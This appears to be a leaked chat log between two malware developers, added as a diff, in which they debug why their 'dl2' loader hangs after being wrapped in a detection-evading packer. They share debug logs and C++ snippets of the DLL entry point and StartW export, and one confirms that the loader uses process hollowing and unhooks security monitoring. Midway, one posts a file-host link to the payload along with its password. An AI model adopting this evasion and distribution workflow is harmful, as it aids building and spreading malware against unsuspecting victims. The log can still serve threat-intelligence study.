@@ -1,0 +1,106 @@
+[24.08.21 11:36:24] royal: Hi. I'm about the dl2 loader, which doesn't work in crypto.
+[24.08.21 11:36:38] royal: Test.
+[24.08.21 11:37:04] royal: Hi. I'm about the dl2 loader, which doesn't work in crypta.
+[24.08.21 11:37:29] allen: Hi. Yeah. Did you see the log?
+[24.08.21 11:38:16] royal: See after line 8 is not mine.
+[24.08.21 11:38:55] allen: Whose?
+[24.08.21 11:39:17] royal: I don't know.
+[24.08.21 11:39:36] royal: Run it without crypt, I have a completely different log there.
+[24.08.21 11:40:28] allen: Can you insert OutputDebugStringA with first command right after StartW function?
+[24.08.21 11:41:20] royal: With logs is written to file dl2.log
+[24.08.21 11:41:31] royal: To desktop.
+[24.08.21 11:41:54] allen: You need to figure out where it hangs. And right after executing any OutputDebugStringA command?
+[24.08.21 11:42:14] allen: I'll have a look at the file...
+[24.08.21 11:42:36] allen: Can I get the source code of paiload?
+[24.08.21 11:43:02] royal: How does it run?
+[24.08.21 11:43:13] royal: Is the entry point running?
+[24.08.21 11:43:24] royal: And then StartW
+[24.08.21 11:43:31] allen: rundll32 file,StartW
+[24.08.21 11:43:49] royal: In load is the entry point started?
+[24.08.21 11:44:01] royal: Just like rundll32 does
+[24.08.21 11:44:09] royal: And then StartW
+[24.08.21 11:44:13] allen: Sure. The entry point is started. From the entry point of the cryptor.
+[24.08.21 11:45:11] allen: You can see the startup log:
+00000007 0.03552420 [5008] Loading library from payload; Calling EntryProc(DLL_PROCESS_ATTACH)
+[24.08.21 11:45:35] allen: 00000008 2.14418435 [5008] Starting StartW
+[24.08.21 11:45:49] royal: What's next?
+[24.08.21 11:46:30] allen: The last one is directly calling YOUR SartW. I don't know what's next.
+[24.08.21 11:47:23] allen: Give me a load - I'll run it and see the log.
+[24.08.21 11:54:58] royal: Download: https://qaz.im/load/FsFrSZ/6dHdyE
+    Delete: https://qaz.im/index.php?a=delete&q=1197033403
+[24.08.21 11:55:08] royal: M6UtiWzz~BbQ?m_s+:rp
+[24.08.21 12:54:41] allen: Can I see the EntryPoint code?
+[24.08.21 13:03:32] royal: BOOL WINAPI _DllMainCRTStartup(HINSTANCE hInst, DWORD dwReason, LPVOID lpvReserved)
+{
+#ifndef __MINGW32__
+    InitCrt();
+#endif // !__MINGW32__
+
+    return DllMain(hInst, dwReason, lpvReserved);
+}
+[24.08.21 13:07:34] royal: BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
+{
+    switch (fdwReason)
+    {
+    case DLL_PROCESS_ATTACH:
+        g_winapiProxy = new WinapiProxy;
+        g_selfInfo.fileName[0] = L'\0';
+        KERNEL32->getModuleFileNameW(hinstDLL, g_selfInfo.fileName, _countof(g_selfInfo.fileName));
+        break;
+    case DLL_THREAD_ATTACH:
+        break;
+    case DLL_THREAD_DETACH:
+        break;
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+
+    return TRUE;
+}
+[24.08.21 13:08:00] royal: DllMain tries to get its name via hinstDll
+[24.08.21 13:08:47] royal: If that didn't work, your name is already taken in StartW via StartW function's return address, which will be inside crypt.
+[24.08.21 13:10:10] royal: void StartW()
+{
+    if (!g_selfInfo.fileName[0])
+    {
+#if defined(__clang__) || defined(__MINGW32__)
+        PVOID retAddrs = __builtin_return_address(0);
+#else
+        PVOID retAddrs = _ReturnAddress();
+#endif // __clang__ || __MINGW32__
+        HMODULE caller = nullptr;
+        if (KERNEL32->getModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS
+            | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (PWSTR)retAddrs, &caller))
+        {
+            KERNEL32->getModuleFileNameW(caller, g_selfInfo.fileName,
+                _countof(g_selfInfo.fileName))
+        }
+    }
+
+    _tmain(0, nullptr);
+}
+[24.08.21 13:10:31] royal: Getting name if failed in DllMain, calling main.
+[24.08.21 13:11:23] royal: If main is called, then in the log it will say Started
+[24.08.21 13:11:48] royal: If it didn't get to main, it must have gone either to DllMain or to STartW
+[24.08.21 13:12:05] allen: Is there anything illegal in WinapiProxy class?
+[24.08.21 13:12:52] allen: You mean in constructor?
+[24.08.21 13:12:58] royal: You load libraries there through LoadLibrary
+[24.08.21 13:13:09] royal: They remove hooks.
+[24.08.21 13:13:13] allen: I called it on a working machine.
+[24.08.21 13:15:59] allen: I called the EntryPoint function on a work machine. I don't understand why the StartW address is valid. This is where to dig....
+[24.08.21 13:17:06] royal: Invalid in crypto?
+[24.08.21 13:18:01] allen: Yes. The directory seems to be readable. Otherwise the name StartW wouldn't slip through.
+[24.08.21 13:19:01] allen: Okay. I'll think about it. I'll report back later.
+[24.08.21 13:19:11] royal: OK.
+[08.09.21 12:56:18] allen: Hi. dl2_x64_32_395.dll - yours?
+[08.09.21 13:47:28] royal: Hi. Mine.
+[08.09.21 13:59:50] allen: On what principle does it work? Not ProcessHollowing by any chance?
+[08.09.21 14:00:04] royal: Yes.
+[08.09.21 14:00:18] allen: And what is it crypting into?
+[08.09.21 14:00:25] allen: In DLL?
+[08.09.21 14:00:32] royal: To exe
+[08.09.21 14:00:37] royal: Generic
+[08.09.21 14:00:46] royal: Didn't they say?
+[08.09.21 14:01:23] allen: I see. Now I'll give Wild the task to try it again. I'm just going to make sure....
+[08.09.21 14:02:31] royal: Putting it into dll could theoretically work too, but just using LoadLibrary won't work, it freezes for good.
+[08.09.21 14:04:08] royal: The main thing is not to call entry point inside DllMain.
